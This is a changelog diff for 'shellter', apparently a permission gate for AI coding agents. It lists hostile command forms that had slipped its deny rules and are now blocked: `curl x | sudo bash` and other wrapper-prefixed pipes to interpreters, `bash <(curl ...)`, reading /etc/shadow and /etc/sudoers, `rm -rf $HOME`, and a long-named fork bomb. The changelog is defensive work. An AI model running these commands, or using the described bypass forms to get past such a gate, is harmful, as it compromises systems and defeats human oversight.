@@ -413,13 +413,53 @@ what the real expander/recursion does, or it relaxes further than intended.
   a false "Merged" message). Arrays now reset to `{}` like other malformed shapes.
 - *`batch <<< payload` regressed from deny to fallthrough.* `at`/`batch` with no
   command-shaped argument read the job from stdin; that stdin form now asks.
+- *A command wrapper between `|` and the interpreter auto-approved download-and-execute.*
+  `curl x | command bash` (also `| timeout 5 bash`, `| sudo bash` -- as ROOT, `| env FOO=1 bash`,
+  `| sudo -u root bash`, `| timeout --signal KILL 5 bash`) slipped every pipe-to-interpreter deny
+  rule -- each anchored the interpreter immediately after `|` -- while the wrapper-keyword approve
+  rule blanket-approved the stage, so the verdict was `allow`, with no prompt. A new tokenized
+  check steps over a leading run of command wrappers (`sudo`/`doas`/`env`/`command`/`nohup`/`time`/
+  `nice`/`ionice`/`stdbuf`/`setsid`/`timeout`) and the flags they take -- reusing the existing
+  `WRAPPER_VALUE_FLAGS` arity table so a flag with a separate-token value (`-u root`, `--signal
+  KILL`) is stepped, not mistaken for the command -- then denies if the stage's real command word
+  is an interpreter run bare or with `-c`/`-i`/`-s`. Because it tokenizes, a quoted interpreter
+  (`| "bash"`, `| b"a"sh`) is de-quoted and denied too. `timeout 30 npm test`, `sort f | grep bash`,
+  `echo x | sudo tee f` and `curl x | python3 -m pip install y` are untouched -- a wrapper is only
+  stepped ahead of a real interpreter, and `python -m` is a module run, not the piped data. The
+  scan reads all option tokens (not just the first), so `bash -eu -c` / `ruby -w -e` no longer
+  slip, and treats a stdin-reference script arg (`bash /dev/stdin`, `/dev/fd/0`, a lone `-`) as
+  reading the pipe. Deno/Bun's subcommand grammar is handled: `deno run -`/`run /dev/stdin`, bare
+  `deno`, and `deno repl` deny, while `deno test`/`bun test` and `deno run app.ts` stay fine. The
+  same wrapper-stepping now guards the shell process-substitution deny, so `timeout 5 bash <(curl
+  ...)` denies like `bash <(curl ...)` -- including the no-space `bash<(curl ...)` form.
+- *shellter never gated the Unix credential stores.* `cat /etc/shadow` (and `/etc/gshadow`,
+  `/etc/sudoers`, the BSD/macOS `/etc/master.passwd`) returned `allow` -- the password-hash and
+  sudoers files were readable with no prompt, at both the Bash and the file-tool (`Read`/`Edit`)
+  entry points. They now hard-deny like `.ssh`/`.env`, anchored to `/etc/` so the bare word
+  "shadow" and world-readable `/etc/passwd` are unaffected. (Both this and the `sudo`-wrapper
+  gap were surfaced by running an independent judgment model over an attack/benign command
+  battery and diffing its verdicts against shellter's.)
+- *Wiping the home directory could fall through unprotected.* Seeding `$HOME` to its real value
+  (so `cat $HOME/notes.txt` auto-approves) meant `rm -rf $HOME` relied entirely on the expanded
+  literal matching a system prefix -- but `RM_SYSTEM_PREFIX` is Unix-only and lacked `/root`, so
+  on Windows (and for the Linux root user) the home-wipe silently fell through, a regression from
+  0.7.1's blanket `$VAR` deny. `rm -rf` now treats the home directory itself (any OS) and `/root`
+  as protected, so `$HOME`/`${HOME}`/`"$HOME"`/`$HOME/`, a literal quoted home path, and `/root`
+  all hard-deny like `~`. A subdir cleanup (`$HOME/.cache/app`) still falls through. (Reaching the
+  quoted forms also required fixing `tokenizeArgs` to match bash's double-quote escaping -- it was
+  dropping the backslashes in `"C:\Users\me"`, so the path never matched.)
+- *A long-named fork bomb slipped the deny.* The ReDoS bound on the fork-bomb name was 64 chars,
+  which a deliberately long function name stepped over; raised to 256 (still linear-time).
+- *A PowerShell `rm -rf $Var` asked spuriously.* `rmVarTargetAsk` looked `$Dir` up in the var
+  table by its raw name, but PowerShell names are stored lowercased, so a resolved-safe target
+  read as unresolved and prompted. It now resolves against both casings.
 
 **Also:** the shared codex/agy adapter test had four stale assertions expecting a ChatML role
 marker on an ordinary file to deny; 0.7.0 made that Class B (destination-gated), so the
 fixtures now target an agent-instruction file and a new assertion pins the gate itself.
 First CI: GitHub Actions on ubuntu (node 18/20/22) and windows (node 20).
 
-840 tests.
+922 tests.
 
 ## [0.7.1] - 2026-07-29
 
